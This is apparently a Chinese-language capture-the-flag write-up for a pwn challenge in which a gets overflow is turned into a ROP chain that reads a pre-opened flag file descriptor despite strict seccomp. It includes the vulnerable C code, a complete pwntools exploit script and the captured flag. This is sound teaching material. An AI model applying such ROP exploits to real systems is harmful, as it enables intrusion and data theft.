# Void

## 题目简述

静态链接程序先打开 `flag.txt`，再启用 strict seccomp，最后用 `gets` 读入 16 字节栈缓冲区。seccomp 禁止 `open` 和 `execve`，但题目已经把 flag 文件留在文件描述符 3；因此只需 ROP 调用允许的 `read`、`write` 完成文件内容转发。

## 解题过程

主函数的顺序决定了解法：

```c
char buf[16];
int flag = open("flag.txt", O_RDONLY);
prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT);
gets(buf);
```

在干净的服务进程中，标准输入、输出、错误占用 0、1、2，紧接着打开的 flag 通常是 fd 3。strict 模式仍允许 `read`、`write`、`_exit` 和 `sigreturn`，而静态 ELF 提供了足够的 ROP gadget。循环偏移测试得到保存返回地址距 `buf` 为 `0x28`。

选择 `.bss` 中的可写区域作为中转，利用链为：

```python
from pwn import *

elf = context.binary = ELF("./void")
io = process(elf.path)
scratch = 0x4c6000

rop = ROP(elf)
rop.call(0x447540, [3, scratch, 0x80])  # read
rop.call(0x4475e0, [1, scratch, 0x80])  # write

io.sendline(b"A" * 0x28 + rop.chain())
print(io.recvline_contains(b"grey{").decode())
```

第一段从 fd 3 读取 flag，第二段写到 stdout，得到：

```text
grey{i_m_a_professional_abyss_gazer_uwu}
```

若部署环境在进入程序前额外打开了文件，fd 可能不再是 3；本题的容器启动方式没有这种额外描述符，官方解法也据此固定使用 fd 3。

## 方法总结

沙箱题应先区分“不能发起某动作”和“所需资源是否已经准备好”。这里不能再打开文件或启动 shell，但 flag 已被预先打开，允许的两个基本系统调用足以搬运数据。静态链接还让全部 gadget 和系统调用封装地址固定，避免了额外泄漏。
